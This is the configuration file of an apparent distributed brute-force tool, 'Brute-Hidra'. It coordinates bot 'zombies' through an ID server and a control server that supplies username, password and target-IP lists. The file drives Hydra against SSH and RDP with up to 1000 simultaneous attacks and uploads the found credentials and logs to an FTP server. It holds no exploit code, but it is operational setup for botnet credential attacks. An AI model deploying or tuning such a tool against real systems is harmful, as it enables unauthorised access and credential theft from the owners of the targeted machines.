# Hash tag is for comments
#ID
ID="-1" #Base ID
ID_server="192.168.1.135" # IP of the server ID *
ID_port="5656" # Port of the server ID
ID_msg="GETID" #- DONT TOUCH - Specific mesage of the protocol
ID_ack="ACK" # - DONT TOUCH - Specific answering message of the protocol
ID_lsiten="10000000" # max number of zombies (just set it hight)

#OWN EXECUTABLE
exe_brute="brute-hydra.exe" # Brute-Hidra exe file


#Server inforamtion
server="http://192.168.93.135:8080" # HTTP server IP:PORT *
server_user="user.txt" #Users file
server_pass="pass.txt" #Paswords file
server_ips="ip.txt" #Target IPs file
server_control="control.txt" #Control file "start,stop,id,load,log"
server_id="id.txt" #Sum of ids file
server_configurations="config.py" #Name of this file
server_output="output.txt" #Output of founded user+pass 

control_updateTime="2.0"  #Time to look at contol file *

#FTP --> For founded user+pass and for log collection
ftp_ip="192.168.93.135" #IP for FTP *
ftp_user="" #FTP user *
ftp_pass="" #FTP password *
ftp_dir="~/Documentos" #FPT directory *

#SERVICES --> Additional paramters for HYDRA
service_ssh="-t 10" #Additional options: -t, -w, -W *
service_rdp="-t 5" #Separated by space *

#HYDRA
exe_hydra="./attackers/hydra/hydra.exe"
hydra_output="output.txt"
hydra_thread_limit="1000" #Limit of Hydra simultaneous attacks *
hydra_time_threadLimit="10.0" #Time to review if a Hydra attack ended to add another one -> If there are more then hread_limits attacks
hydra_time_finalWait="10.0"#Every 10 will review if last hydra attacks ended
